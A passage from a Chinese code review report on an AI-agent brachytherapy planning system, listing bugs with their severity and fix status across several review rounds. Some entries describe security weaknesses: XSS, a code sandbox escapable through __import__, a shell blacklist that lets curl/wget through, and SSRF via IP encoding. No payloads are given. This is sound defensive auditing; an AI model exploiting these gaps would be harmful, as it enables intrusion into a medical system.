| 13 | 552-604 | 🟡 Medium | `ImageResample_size` 使用 `np.isin` 全数组验证，O(N*M) 太慢 |
| 14 | 716-752 | 🟡 Medium | `cal_next_seed_pos` 硬编码 `target_value=1` 而非使用参数 |
| 15 | 755-794 | 🟡 Medium | `cal_next_seed_direc` 同样硬编码 `target_value=1` |
| 16 | 1463-1483 | 🟡 Medium | `constraint_bounds` 使用 `&`（AND）而非 `|`（OR），`(x<0) & (x>1)` 永远为 False |
| 17 | 2206-2207 | 🟡 Medium | `line_source_map` 中 z 分量取反无注释，坐标系约定不明 |
| 18 | 3511-3704 | 🟡 Medium | `select_optimal_trajectory` 每个候选 O(N*M) 性能问题 |
| 19 | 3682 | 🔴 **Critical** | `reinforcement.reinforcement_planning()` 被调用但 `reinforcement` 导入被注释掉 — RL 规划会崩溃 `NameError` |
| 20 | 3812-3884 | 🟡 Medium | `get_available_position` 在列表推导中对每个元素调用 3 次 `position_transform` |
| 21 | 3998-4025 | 🟡 Medium | `remove_unproper_seed` 使用概率选择，变量命名暗示是计数而非阈值 |

### plans/fitting_model.py

| # | 行号 | 严重度 | 问题 |
|---|------|--------|------|
| 22 | 276-361 | 🔴 **Critical** | `DoseOptimizationLoss.forward` 在循环中重新赋值 `radiation` 而非原地更新，破坏了梯度计算图 — 优化规划无法正确反向传播 |
| 23 | 282-321 | 🟡 Medium | 每个种子单独计算旋转矩阵，未批量化，无法利用 GPU 并行 |
| 24 | 365 | 🔵 Low | 类名 `early_stop` 违反 PEP 8（应为 `EarlyStop`）|
| 25 | 431-432 | 🟡 Medium | 动态 patience 减半可能导致过早停止 |

### plans/visualizer.py

| # | 行号 | 严重度 | 问题 |
|---|------|--------|------|
| 26 | 183-186 | 🔴 **Critical** | VTK 图像填充使用三层 Python 循环（512×512×300 = 7800 万次迭代），应使用 `numpy_to_vtk` 零拷贝转换 |
| 27 | 83-106 | 🟡 Medium | `start()` 方法包含硬编码 demo 代码 |
| 28 | 355 | 🔵 Low | 参数名拼写错误：`target_vulue` 应为 `target_value` |

### plans/reinforcement.py

| # | 行号 | 严重度 | 问题 |
|---|------|--------|------|
| 29 | 243-256 | 🔴 **Critical** | `_reward_core` 可能为 None（导入失败）但被无保护调用，会崩溃 |
| 30 | 358-386 | 🟡 Medium | `LowLevelEnv.step` 返回 3-tuple 而非现代 gymnasium 的 5-tuple |
| 31 | 691-711 | 🟡 Medium | `DVH2Rewards` mask 逻辑使用 `!= target_value` 而非 `== 0`，受浮点精度影响 |
| 32 | 703-708 | 🔴 **Critical** | `DVH2Rewards` 中 `np.count_nonzero` 可能返回 0 导致除零错误 |
| 33 | 795-831 | 🟡 Medium | 基线规划在 `reward_calculator.mask_volume` 初始化前访问 |
| 34 | 1030-1035 | 🟡 Medium | 异常处理器使用可能未定义的 `best_plan` |

### plans/brachy_plan_v2.py

| # | 行号 | 严重度 | 问题 |
|---|------|--------|------|
| 35 | 375-499 | 🔴 High | `replan_single_needle` 包含 30+ 个 `print()` 调试语句，会淹没 stdout |
| 36 | 442-445 | 🟡 Medium | 用 CTV 段长度覆盖计算出的 `target_depths`，可能在背景间隙放置种子 |
| 37 | 448-449 | 🟡 Medium | 深度检查后未 return，继续执行 `put_seeds` 浪费计算 |

### plans/device_manager.py

| # | 行号 | 严重度 | 问题 |
|---|------|--------|------|
| 38 | 317 | 🔵 Low | `_leases` 列表在锁外追加，非线程安全 |

### plans/dose_pre/ (剂量预测)

| # | 行号 | 严重度 | 问题 |
|---|------|--------|------|
| 39 | functions.py:79-127 | 🟡 Medium | `line_source_map` 返回 SimpleITK Image，但 `utilizations.py` 版本返回 numpy array，不一致 |
| 40 | Predict_crop.py:9 | 🔵 Low | `import dose_pre.myDoseNet` 使用绝对路径，作为包导入会失败 |
| 41 | Predict_crop.py:95-171 | 🔵 Low | 测试代码包含硬编码 Windows 路径 |
| 42 | myDoseNet.py:125-201 | 🔵 Low | 7 个未使用的上采样层浪费 GPU 内存 |

### skills/ 子系统

| # | 行号 | 严重度 | 问题 |
|---|------|--------|------|
| 43 | skill_base.py:94 | 🟡 Medium | `find_by_trigger` 排序启发式在 `usage_count=0` 时失效 |
| 44 | skill_base.py:192-193 | 🟡 Medium | `from_dict` 遇到额外 key 时崩溃（`TypeError`）|
| 45 | advanced_skills.py:166,191 | 🟡 Medium | LiverFullSkill/LungFullSkill 的 `ref_direc` 参数使用了错误的 key |

---

## 12. 测试与基准测试深度审查

> 由并行子 Agent 深度审查 `tests/`、`benchmarks/`、根目录 debug/test 文件发现。

### 根目录调试文件 (应从仓库删除)

| 文件 | 严重度 | 问题 |
|------|--------|------|
| `test_quick.py` | 🔴 Critical | 硬编码患者数据路径 `/home/lht/.../CTyuanaju.nii`，无任何断言 |
| `test_store.py` | 🔴 High | 硬编码 localhost:5000，无断言 |
| `test_bugs.py` | 🔴 High | 243 行，零断言，纯手动调试脚本 |
| `test_bugs2.py` | 🔴 High | 297 行，仅 1 个断言 |
| `debug_full_flow.py` | 🔴 High | 硬编码时间戳上传路径，仅特定日期有效 |
| `debug_mask_orientation.py` | 🔴 High | 同上 |
| `debug_mask_orientation2.py` | 🔴 High | 同上 |
| `debug_live_mask.py` | 🟡 Medium | 无断言，手动调试脚本 |

### tests/ (正式测试)

| # | 文件 | 严重度 | 问题 |
|---|------|--------|------|
| 1 | test_multi_agent_*.py | 🔴 High | 所有 `async def` 测试函数缺少 `@pytest.mark.asyncio` 装饰器 — pytest 收集但不执行，显示"通过"但实际未运行 |
| 2 | test_multi_agent_phase2.py:66 | 🟡 Medium | "good plan" 测试使用 `v100=0.96` 一定会通过，无边界值测试 |
| 3 | test_multi_agent_phase3.py:130-161 | 🟡 Medium | 格式测试断言过于宽松 |
| 4 | test_brain_system.py:76-87 | 🔴 High | 断言特定模型名（`hy3-preview`、`claude-opus-4.7`）会随时间过期 |
| 5 | test_brain_system.py:92-121 | 🟡 Medium | 假设 `brain_available=False`，无法测试实际 brain 集成 |
| 6 | 所有测试 | 🔴 High | 零覆盖：HTTP 路由、SSE 流、规划管道、文件上传、会话管理、前端 |

### benchmarks/

| # | 文件 | 严重度 | 问题 |
|---|------|--------|------|
| 7 | 所有 v2 JSON | 🔴 Critical | 硬编码 `/home/lht/.../CTyuanaju.nii` 路径，不可移植 |
| 8 | 07_safety.json, 15_safety.json | 🔴 High | `forbidden_keywords` 包含 "done"、"set"、"changed" 等常见英文词，导致误报 |
| 9 | 30_e2e_clinical_validation.json | 🔴 High | `expected_answer: "90"` 匹配任何含 "90" 的字符串（"D90"、"190"、"90%"），无意义 |
| 10 | aligned_benchmark.py:220-306 | 🔴 High | 评分函数可游戏：`tool_called` 未调用也给 0.3 分，完整性是二值的 |
| 11 | aligned_benchmark.py:12-14 | 🔴 Critical | 所有路径硬编码为绝对路径 |
| 12 | auto_monitor.py:34,41,60,104,125 | 🔴 High | 5 个裸 `except:` 子句，捕获包括 `SystemExit`、`KeyboardInterrupt` |
| 13 | auto_monitor.py + run_aligned_agents.sh | 🔴 High | 只覆盖类别 1-8，遗漏 9-30 |
| 14 | archive/ | 🟡 Medium | 58 个日志文件 + 81 个死脚本（1.5MB，18,824 行）|

### 测试框架不一致

- `test_brain_system.py` 使用 `unittest.TestCase`
- `test_multi_agent_*.py` 使用原始 `async def`（不兼容 pytest）
- 根目录文件使用独立脚本
- 无 `.pytest.ini`、`pyproject.toml` 或 `setup.cfg`

### 缺失的测试维度

- 不同器官部位（前列腺、肺、肝）
- 不同图像尺寸
- 损坏/无效的 DICOM 文件
- LLM 空响应
- 工具执行中抛异常
- GPU 内存不足
- 并发请求同一会话

---

## 13. 建议与修复优先级

### 立即修复 (P0)

1. **C-01**: 删除虚拟环境目录
2. **C-02**: 实现 shell 命令白名单
3. **C-03**: 实现代码执行沙箱
4. **C-05**: 引入 DOMPurify 防止 XSS
5. **C-10**: 实现工具权限控制

### 短期修复 (P1, 1-2 周)

1. **H-01**: 拆分 AgenticSys.py
2. **H-03**: 重构工具注册
3. **H-06**: 改进异常处理
4. **H-08**: 移除全局变量
5. **C-04**: 加强路径验证

### 中期修复 (P2, 1-2 月)

1. **H-02**: 拆分前端文件
2. **H-04**: 修复内存泄漏
3. **H-15**: 添加类型注解
4. **H-16**: 增加测试覆盖率
5. **A-01**: 重构为模块化架构

### 长期改进 (P3, 3-6 月)

1. **A-02**: 实现依赖注入
2. **A-03**: 采用事件驱动架构
3. **A-04**: 实现统一缓存层
4. **S-01**: 实现身份认证
5. **S-04**: 实现数据加密

---

## 附录 A: 文件统计

| 目录 | Python 文件 | JS/HTML/CSS 文件 | 总行数 |
|------|------------|-----------------|--------|
| AgenticSys.py | 1 | 0 | 6,423 |
| agents/ | 8 | 0 | ~2,000 |
| brain/ | 45 | 0 | ~8,000 |
| memory/ | 13 | 0 | ~3,000 |
| tool_factory/ | 100+ | 0 | ~15,000 |
| web/ | 4 | 3 | ~12,000 |
| skills/ | 7 | 0 | ~2,000 |
| plans/ | 12 | 0 | ~4,000 |
| 其他 | 20+ | 0 | ~3,000 |
| **总计** | **~200** | **~3** | **~55,000+** |

## 附录 B: 依赖清单

### 核心依赖
- numpy >= 1.24.0
- scipy >= 1.10.0
- SimpleITK >= 2.3.0
- torch >= 2.0.0
- monai >= 1.3.0
- flask >= 3.0.0
- openai >= 1.0.0

### 可选依赖
- TotalSegmentator >= 2.2.0
- nnunetv2 >= 2.3.0
- nibabel >= 5.1.0
- pydicom >= 2.4.0

---

## 第二轮深度审查 (2026-06-27)

> 5 个并行 Agent 对所有修改后的代码进行二次审查，发现以下新问题。

### AgenticSys.py 新发现

| # | 行号 | 严重度 | 问题 |
|---|------|--------|------|
| R-01 | 3824 | 🔴 Critical | `page_content` 未定义 — 搜索返回空结果时 NameError 崩溃 |
| R-02 | 3279-3289 | 🔴 Critical | `_check_search_reliability` 创建新 event loop 未关闭 — 内存泄漏 |
| R-03 | 5839-5844 | 🔴 Critical | 多 Agent 路由 event loop 未关闭 — 内存泄漏 |
| R-04 | 6040-6152 | 🔴 Critical | Review phase event loop 未关闭 — 内存泄漏 |
| R-05 | 1944 | 🔴 Critical | `from AgenticSys import ToolResult` — 类不存在于该模块 |
| R-06 | 2991-2995 | 🟠 High | 处方剂量乘以 120 — 如果已经是 Gy 则错误 |
| R-07 | 5041-5154 | 🟠 High | `_pending_callback_events` 无线程锁保护 |
| R-08 | 4695-4703 | 🟠 High | 流式强制搜索: 成功时 step 状态保持 "pending" |
| R-09 | 5124-5125 | 🟡 Medium | `time.sleep(0.08)` 在生成器中阻塞整个线程 |

### web/server.py 新发现

| # | 行号 | 严重度 | 问题 |
|---|------|--------|------|
| R-10 | 3148-3229 | 🟠 High | 导出端点缺少路径验证 — 可创建任意目录 |
| R-11 | 227-285 | 🟠 High | 会话管理非线程安全 (Flask threaded=True) |
| R-12 | 45-95 | 🟡 Medium | TaskManager 任务永不清理 — 无界内存增长 |
| R-13 | 112-139 | 🟡 Medium | 速率限制存储非线程安全 |
| R-14 | 3147-3229 | 🟡 Medium | 导出端点缺少 auth/rate-limit 装饰器 |

### web/app/index.html 新发现

| # | 行号 | 严重度 | 问题 |
|---|------|--------|------|
| R-15 | 6168-6259 | 🔴 Critical | `marked.parse()` 无消毒 — XSS via LLM 输出 |
| R-16 | 多处 | 🟠 High | innerHTML 使用未消毒的服务器/DICOM 数据 |
| R-17 | 8931-8940 | 🟡 Medium | DICOM 元数据值未 HTML 转义 |
| R-18 | 7000-7003 | 🟡 Medium | 思考指示器计时器错误时可能泄漏 |

### tool_factory/ 新发现

| # | 文件 | 严重度 | 问题 |
|---|------|--------|------|
| R-19 | web_search/__init__.py:948 | 🔴 Critical | `_search_wanfang` 函数重复定义（复制粘贴合并错误）|
| R-20 | planning_pipeline.py:1056 | 🟠 High | `ref_direc` 变量未定义 — NameError |
| R-21 | OAR_seg/__init__.py:146 | 🟠 High | oar_mask 元数据设为 CT 图像而非 OAR mask |
| R-22 | code_executor/__init__.py | 🟠 High | 沙箱可被绕过 (os, __import__, getattr 允许) |
| R-23 | shell_executor/__init__.py | 🟠 High | 命令验证可被轻易绕过 |
| R-24 | dicom_rt_exporter.py:170-187 | 🟠 High | 轮廓几何无效（点云而非轮廓线）|
| R-25 | dicom_rt_exporter.py:176 | 🟠 High | 物理坐标无方向余弦处理 |
| R-26 | web_fetch/__init__.py:132 | 🟡 Medium | SSRF 绕过 via IP 编码 |
| R-27 | env_manager/__init__.py:564 | 🟡 Medium | 卸载跳过包验证 |
| R-28 | report_generator/__init__.py:108 | 🟡 Medium | D90 单位不匹配 (Gy vs %) |

### agents/ 新发现

| # | 文件 | 严重度 | 问题 |
|---|------|--------|------|
| R-29 | orchestrator.py | 🔴 Critical | 同步回调阻塞事件循环 — 并行 review 变串行 |
| R-30 | completeness_checker.py | 🟠 High | 使用 SAFETY_GUARDIAN 角色而非 COMPLETENESS_CHECKER |
| R-31 | safety_guardian.py | 🟠 High | "zh" 标签与英文相同 — 未翻译 |
| R-32 | fact_checker.py | 🟡 Medium | 硬编码 "pass" 决策 — 不反映实际发现 |
| R-33 | plan_reviewer.py | 🟡 Medium | 评分公式中 `confidence` 权重不合理 |

### brain/ 新发现

| # | 文件 | 严重度 | 问题 |
|---|------|--------|------|
| R-34 | providers/gemini_llm.py | 🟠 High | Gemini provider 静默丢弃所有 tool calls |
| R-35 | providers/gemini_llm.py | 🟠 High | Gemini provider 在 system message 时崩溃 |
| R-36 | core/tree_search_planner.py | 🟠 High | MCTS UCB1 公式错误 — 树搜索本质上是随机的 |
| R-37 | providers/*.py | 🟡 Medium | 9/16 provider 的 tool call 格式不一致 |
| R-38 | core/tool_code_writer.py | 🔴 Critical | 可执行 LLM 生成的任意代码 — 安全风险 |

### memory/ 新发现

| # | 文件 | 严重度 | 问题 |
|---|------|--------|------|
| R-39 | interaction_memory.py | 🟡 Medium | `clear()` 方法 NameError 崩溃 |
| R-40 | experience_memory.py | 🟡 Medium | 无界增长 — 经验永不清理 |
| R-41 | self_evolution.py | 🟡 Medium | 6 处 `.append()` 无上限 |
| R-42 | skill_learner.py:124-139 | 🔵 Low | 参数解析 bug — key 格式错误 |
| R-43 | language.py:140-145 | 🔵 Low | `session_language_store` 是空函数 |

### plans/device_manager.py 新发现

| # | 行号 | 严重度 | 问题 |
|---|------|--------|------|
| R-44 | 317 | 🟡 Medium | `_leases.append()` 未加锁保护 |
| R-45 | 326 | 🟡 Medium | `_leases.remove()` 未加锁保护 |
| R-46 | 291 | 🟡 Medium | `_preferred[caller]` 未加锁保护 |

### 第二轮问题核实与修复状态

| # | 问题 | 核实结果 | 状态 |
|---|------|----------|------|
| R-01 | `page_content` 未定义 | ✅ 真 bug — 搜索空结果时 NameError | ✅ 已修复 |
| R-02/03/04 | Event loop 泄漏 | ✅ 真 bug — 异常路径不关闭 loop | ✅ 已修复 (try/finally) |
| R-05 | `from AgenticSys import ToolResult` | ✅ 真 bug — 类不存在于该模块 | ✅ 已修复 |
| R-06 | 处方剂量 *120 | ⚠️ 设计决策 — 归一化→Gy 近似转换 | 跳过 (非 bug) |
| R-07 | `_pending_callback_events` 线程安全 | 待核实 | — |
| R-08 | 流式搜索 step 状态 | 待核实 | — |
| R-09 | `time.sleep` 在生成器中 | ⚠️ 80ms 延迟可接受 | 跳过 (非关键) |
| R-10 | 导出端点路径验证 | 待核实 | — |
| R-11 | 会话管理线程安全 | 待核实 | — |
| R-12 | TaskManager 内存泄漏 | 待核实 | — |
| R-13 | 速率限制线程安全 | 待核实 | — |
| R-14 | 导出端点缺少 auth | 待核实 | — |
| R-15 | `marked.parse()` XSS | ✅ 真 bug — 无消毒 | ✅ 已修复 |
| R-16 | innerHTML 未消毒 | ✅ 通过 R-15 修复 (renderMarkdown 统一消毒) | ✅ 已修复 |
| R-17 | DICOM 元数据未转义 | 待核实 | — |
| R-18 | 思考指示器泄漏 | 待核实 | — |
| R-19 | `_search_wanfang` 重复定义 | ✅ 真 bug — 复制粘贴错误 | ✅ 已修复 |
| R-20 | `ref_direc` 未定义 | ✅ 真 bug — NameError | ✅ 已修复 |
| R-21 | OAR mask 元数据错误 | 待核实 | — |
| R-22 | 代码执行器沙箱绕过 | 待核实 | — |
| R-23 | Shell 执行器验证绕过 | 待核实 | — |
| R-24 | DICOM 轮廓几何无效 | 待核实 | — |
| R-25 | DICOM 方向余弦 | 待核实 | — |
| R-26 | SSRF 绕过 | 待核实 | — |
| R-27 | env_manager 卸载跳过验证 | 待核实 | — |
| R-28 | D90 单位不匹配 | 待核实 | — |
| R-29 | 同步回调阻塞事件循环 | 待核实 | — |
| R-30 | CompletenessChecker 角色错误 | ✅ 真 bug — 使用 SAFETY_GUARDIAN | ✅ 已修复 |
| R-31 | SafetyGuardian 中文标签 | 待核实 | — |
| R-32 | FactChecker 硬编码 pass | 待核实 | — |
| R-33 | PlanReviewer 评分公式 | 待核实 | — |
| R-34 | Gemini 丢弃 tool calls | 待核实 | — |
| R-35 | Gemini system message 崩溃 | 待核实 | — |
| R-36 | MCTS UCB1 公式错误 | 待核实 | — |
| R-37 | Provider tool call 格式不一致 | 待核实 | — |
| R-38 | ToolCodeWriter 代码执行 | 待核实 | — |
| R-39 | InteractionMemory.clear() 崩溃 | 待核实 | — |
| R-40 | experience_memory 无界增长 | 待核实 | — |
| R-41 | self_evolution append 无上限 | 待核实 | — |
| R-42 | skill_learner 参数解析 | 待核实 | — |
| R-43 | language.py 空函数 | 待核实 | — |
| R-44/45/46 | device_manager 线程安全 | 待核实 | — |

### 第二轮已修复问题 (8 个)

| # | 文件 | 修复内容 |
|---|------|----------|
| R-01 | AgenticSys.py | `page_content = ""` 初始化 |
| R-02/03/04 | AgenticSys.py | 3 处 event loop `try/finally` 保护 |
| R-05 | AgenticSys.py | `from AgenticSys import` → `from tool_factory import` |
| R-15/16 | index.html | 添加 `_sanitizeHtml()` 消毒器 |
| R-19 | web_search/__init__.py | 删除 `_search_iop` 内死代码 |
| R-20 | planning_pipeline.py | `ref_direc` → `"auto"` |
| R-30 | 3 个文件 | 添加 `COMPLETENESS_CHECKER` 角色 |

### 第二轮问题统计

| 严重度 | 数量 | 关键发现 |
|--------|------|----------|
| 🔴 Critical | 8 | event loop 泄漏(3)、NameError(2)、XSS(1)、代码执行(1)、重复定义(1) |
| 🟠 High | 14 | 线程安全(3)、逻辑错误(4)、安全绕过(3)、功能bug(4) |
| 🟡 Medium | 14 | 内存泄漏(5)、安全弱点(3)、逻辑(6) |
| 🔵 Low | 2 | 解析bug、死代码 |
| **总计** | **38** | |

---

---

## 第三轮全维度深度审查 (2026-06-27)

> 8 个并行 Agent 对全部子系统进行第三轮深度审查：AgenticSys 核心、Web 服务器、规划算法、工具链、大脑/记忆系统、前端、Prompt/Agent、完整性评审。

### 审查统计

| 维度 | Agent 覆盖 | 新发现 | 已验证 | 更正 |
|------|-----------|--------|--------|------|
| AgenticSys.py | 6849 行逐段 | 9 | 2 | 0 |
| web/server.py | 150 符号 | 6 | 5 | 0 |
| plans/ | 12 文件 ~4000 行 | 12 | 3 | 1 (constraint_bounds 非 bug) |
| tool_factory/ | 100+ 文件 | 8 | 3 | 0 |
| brain/ + memory/ | 30+ 文件 | 7 | 3 | 0 |
| 前端 index.html | ~20000 行 | 5 | 2 | 0 |
| prompts/ + agents/ | 15+ 文件 | 4 | 3 | 1 (R-31 非 bug) |
| 完整性评审 | 8 维度 | 8 | 0 | 0 |
| **总计** | **281 文件** | **59** | **21** | **2** |

---

### 第三轮关键发现 — 🔴 Critical

| # | 文件 | 行号 | 问题 | 类型 |
|---|------|------|------|------|
| T3-01 | brain/providers/gemini_llm.py | 107-114 | **Gemini 永远丢弃 tool calls** — `tool_calls=[]` 硬编码，即使 API 返回函数调用也不解析 | ✅ 已验证 R-34 |
| T3-02 | brain/core/tree_search_planner.py | 47-51 | **MCTS UCB1 公式损坏** — `parent_visits` 硬编码为 1，`_get_parent_visits()` 方法存在但从未调用，树搜索退化为近随机选择 | ✅ 已验证 R-36 |
| T3-03 | web/server.py | 2866-2868 | **剂量等高线单位不匹配** — 剂量数组为归一化单位 (0-94)，但等高线查找使用绝对 Gy 值 (如 120, 180)，永远不会找到等高线 | 🆕 新功能 bug |
| T3-04 | AgenticSys.py | 5058-5171 | **_pending_callback_events 线程不安全** — 列表在多线程环境下无锁操作，clear() 与 append() 竞态 | ✅ 已验证 R-07 |
| T3-05 | plans/reinforcement.py | 243, 250 | **_reward_core None 崩溃** — JIT 扩展不可用时 `_reward_core=None`，但无条件调用 `_reward_core._dvh_oar_jit()` | ✅ 已验证 |
| T3-06 | web/app/index.html | 多处 | **7 处 innerHTML 未消毒** — 行 5601, 8960, 11983, 17645, 18472, 19770, 20347 绕过 `_sanitizeHtml()` | 🆕 XSS 残留 |

### 第三轮关键发现 — 🟠 High

| # | 文件 | 行号 | 问题 | 类型 |
|---|------|------|------|------|
| T3-07 | AgenticSys.py | 135-660 | **AgentMemory 内存泄漏** — planning_results 字典、tool_results 列表无上限，大 numpy 数组无清理钩子 | 🆕 |
| T3-08 | AgenticSys.py | 5367-5382 | **批量存储竞态** — 流式版本中 generator yield 导致消费者断开时，已执行工具的结果不会持久化 | 🆕 |
| T3-09 | AgenticSys.py | 4373-4399 | **响应清理数据丢失** — `_clean_response_text` 用 30+ 正则过度清理，多次应用导致累积丢失 | 🆕 |
| T3-10 | web/server.py | 234-285 | **会话管理非线程安全** — `_sessions` 字典在 Flask threaded=True 下无锁访问 | ✅ 已验证 R-11 |
| T3-11 | web/server.py | 3272-3293 | **SSE 流资源泄漏** — 无超时、无客户端断开检测、无清理保证 | 🆕 |
| T3-12 | plans/geometry.py | 1016 | **空 mask 崩溃** — `find_island_center_adaptive_sigma` 不检查空数组，`np.mean` 返回 NaN | 🆕 |
| T3-13 | plans/fitting_model.py | 291-307 | **DoseOptimizationLoss 梯度不连续** — 方向与 x 轴对齐时的硬分支创建零梯度，优化不稳定 | 🆕 |
| T3-14 | tool_factory/seed_plan/planning_pipeline.py | 623, 988 | **硬编码 [0,1,0] 回退** — 自动恢复路径使用前方向，绕过器官感知修复，胰腺/前列腺病例会失败 | 🆕 |
| T3-15 | tool_factory/code_executor/__init__.py | 101 | **沙箱完全可绕过** — `__import__` 在 safe_builtins 中，ALLOWED_MODULES 不限制 `__import__` 可访问的模块 | 🆕 |
| T3-16 | brain/core/tool_code_writer.py | 193-199 | **动态代码执行** — 尽管有安全验证，仍使用 importlib 执行任意 Python 代码 | ✅ 已验证 R-38 |
| T3-17 | memory/experience_memory.py | 107-127 | **经验记忆无界增长** — record() 无限追加，_save() 每次重写整个 JSON 文件 | ✅ 已验证 R-40 |
| T3-18 | agents/fact_checker.py | 207 | **FactChecker `decision` 硬编码 pass** — 主 Agent 独立验证：`decision` 在主路径无消费者（`format_as_source_summary` 只读 concerns，quality gate APPEND-ONLY 不阻断）。非 bug，是咨询型 agent 的设计意图。已做 cosmetic 改进。 | ⚠️ 降级为 cosmetic |
| T3-19 | agents/orchestrator.py | 190-194 | **同步回调阻塞事件循环** — `run_in_executor` 模式正确但 llm_callback 可能非线程安全 | ✅ 已验证 R-29 |
| T3-20 | config/prompts/medical_safety.md | 10-33 | **OAR 剂量限制硬编码** — 器官耐受值嵌入 prompt 而非运行时从 clinical_kb 获取，可能过时 | 🆕 |
| T3-21 | 完整性评审 | 全局 | **无 Dockerfile / 部署方案** — 无容器化、无 gunicorn、无 SSL 终止、无部署文档 | 🆕 |
| T3-22 | 完整性评审 | 全局 | **_global_agent 绕过会话隔离** — 多用户并发时可能共享状态 | 🆕 |

### 第三轮关键发现 — 🟡 Medium

| # | 文件 | 行号 | 问题 | 类型 |
|---|------|------|------|------|
| T3-23 | web/server.py | 45-93 | **TaskManager 内存泄漏** — 任务永不清理，无 TTL、无驱逐策略 | ✅ 已验证 R-12 |
| T3-24 | web/server.py | 116-139 | **速率限制非线程安全** — `_rate_limit_store` 无同步，并发下可绕过 | ✅ 已验证 R-13 |
| T3-25 | web/server.py | 3153, 3194 | **导出端点 auth 不一致** — DICOM-RT 和 STL 导出无 @require_api_key | ✅ 已验证 R-14 |
| T3-26 | AgenticSys.py | 4712 | **搜索步骤状态误导** — 搜索失败仍设 status="done" | ✅ 已验证 R-08 |
| T3-27 | plans/core.py | 92-101 | **init_plan 缺少最小角度保护** — extract_angle 无限缩小时仍跑满 50 次迭代 | 🆕 |
| T3-28 | plans/utilizations.py | 751 | **魔法数字 1e5** — 应使用 np.inf | 🆕 |
| T3-29 | plans/reinforcement.py | 711 | **DVH2Rewards 潜在除零** — 空 CTV 时 target_v=0 | 🆕 |
| T3-30 | plans/reinforcement.py | 259-260 | **异常吞噬** — SeedPlacementReward.forward 静默捕获所有异常返回零奖励 | 🆕 |
| T3-31 | tool_factory/shell_executor/__init__.py | 22-26 | **命令黑名单不完整** — 空格绕过、sudo 未阻止、curl/wget 被允许 | 🆕 |
| T3-32 | tool_factory/report_generator/__init__.py | 108 | **D90 显示单位错误** — 显示为百分比但应为 Gy | ✅ 已验证 R-28 |
| T3-33 | brain/providers/*.py | 多处 | **9/16 Provider tool call 格式不一致** — Qwen/DeepSeek 缺少 id 字段，Gemini 返回空列表 | ✅ 已验证 R-37 |
| T3-34 | memory/interaction_memory.py | 176 | **clear() NameError** — 缺少 logger 导入 | ✅ 已验证 R-39 |
| T3-35 | memory/self_evolution.py | 69-73 | **进化日志无界增长** | ✅ 已验证 R-41 |
| T3-36 | agents/plan_reviewer.py | 226 | **评分公式有缺陷** — 小样本时分数偏低，不考虑严重性权重 | ✅ 已验证 R-33 |
| T3-37 | agents/safety_guardian.py | 146 | **min_coverage 硬编码 0.80** — 不从 plan_config 读取 | 🆕 |
| T3-38 | 完整性评审 | 全局 | **GPU 内存管理缺失** — 仅 1 个文件调用 empty_cache()，模型权重无清理 | 🆕 |
| T3-39 | 完整性评审 | 全局 | **无流水线回滚** — LLM 中途失败留下部分状态 | 🆕 |
| T3-40 | 前端 | 多处 | **40+ 全局变量** — 无 IIFE 或模块封装，重复定义 escHtml | 🆕 |

### 第三轮关键发现 — 🔵 Low

| # | 文件 | 行号 | 问题 | 类型 |
|---|------|------|------|------|
| T3-41 | plans/fitting_model.py | 430 | **注释/代码不一致** — 注释说除以 10，代码除以 2 | 🆕 |
| T3-42 | plans/device_manager.py | 317 | **_leases append 未加锁** | 🆕 |
| T3-43 | plans/device_manager.py | 384 | **OOM 重试阈值硬编码 1500MB** | 🆕 |
| T3-44 | tool_factory/web_search/__init__.py | 1589-1615 | **_search_weather 死代码** — 方法委托给独立函数，旧代码未清理 | 🆕 |
| T3-45 | tool_factory/seed_plan/planning_pipeline.py | 1540-1545 | **step_callback 异常吞噬** — except Exception 不记录日志 | 🆕 |
| T3-46 | brain/providers/*.py | 多处 | **10+ Provider 缺少流式支持和重试逻辑** | 🆕 |
| T3-47 | memory/layered_memory.py | 151-176 | **非原子写入** — 直接写 JSON 无 temp+rename 模式 | 🆕 |
| T3-48 | memory/smart_context.py | 169-171 | **Token 估算不准** — `len(text)//4` 对中文/代码不准确 | 🆕 |
| T3-49 | 前端 | 8707+ | **Three.js 缺少 renderer.dispose()** 和 controls.dispose() | 🆕 |
| T3-50 | 完整性评审 | 全局 | **DOSE_SCALE 120.0 硬编码于 3+ 处** — 违反 DRY | 🆕 |
| T3-51 | 完整性评审 | 全局 | **患者姓名可能记入日志** — DICOM 头信息含姓名 | 🆕 |
| T3-52 | 完整性评审 | 全局 | **依赖无版本上限** — requirements.txt 全用 >=，关键依赖被注释掉 | 🆕 |

---

### 前轮发现更正

| # | 原报告 | 更正 |
|---|--------|------|
| plans/utilizations.py:1463 | 报告称 `constraint_bounds` 使用 `&` (AND)，逻辑永远为 False | ❌ **实际使用 `|` (OR)，逻辑正确。** 前轮审查误判 |
| agents/safety_guardian.py | 报告称 R-31 "zh" 标签与英文相同未翻译 | ❌ **SafetyGuardian 完全没有 i18n 支持，是缺失功能而非翻译 bug** |

---

### 第三轮问题核实矩阵

| # | 问题 | 核实结果 | 状态 |
|---|------|----------|------|
| R-07 | _pending_callback_events 线程安全 | ✅ 确认无锁 | 🔴 待修复 |
| R-08 | 流式搜索 step 状态 | ✅ 确认失败也显示 done | 🟡 待修复 |
| R-10 | 导出路径验证 TOCTOU | ✅ 确认 makedirs 在验证前 | 🟡 待修复 |
| R-11 | 会话管理线程安全 | ✅ 确认无锁字典操作 | 🟠 待修复 |
| R-12 | TaskManager 内存泄漏 | ✅ 确认无驱逐策略 | 🟡 待修复 |
| R-13 | 速率限制线程安全 | ✅ 确认无同步 | 🟡 待修复 |
| R-14 | 导出 auth 不一致 | ✅ 确认 2/4 端点无 auth | 🟡 待修复 |
| R-28 | D90 单位不匹配 | ✅ 确认显示为 % 应为 Gy | 🟡 待修复 |
| R-29 | 同步回调阻塞 | ✅ 确认 run_in_executor 模式 | 🟠 待修复 |
| R-32 | FactChecker 硬编码 pass | ✅ 确认 decision="pass" 硬编码 | 🟠 待修复 |
| R-33 | PlanReviewer 评分公式 | ✅ 确认公式不考虑严重性 | 🟡 待修复 |
| R-34 | Gemini 丢弃 tool calls | ✅ 确认 tool_calls=[] 硬编码 | 🔴 待修复 |
| R-36 | MCTS UCB1 损坏 | ✅ 确认 parent_visits=1 硬编码 | 🔴 待修复 |
| R-37 | Provider 格式不一致 | ✅ 确认 9/16 不一致 | 🟡 待修复 |
| R-38 | ToolCodeWriter 代码执行 | ✅ 确认 importlib 执行 | 🟠 安全风险 |
| R-39 | InteractionMemory.clear() | ✅ 确认缺少 logger 导入 | 🟡 待修复 |
| R-40 | ExperienceMemory 无界增长 | ✅ 确认无上限 | 🟠 待修复 |
| R-41 | SelfEvolution 日志无界 | ✅ 确认无清理 | 🟡 待修复 |

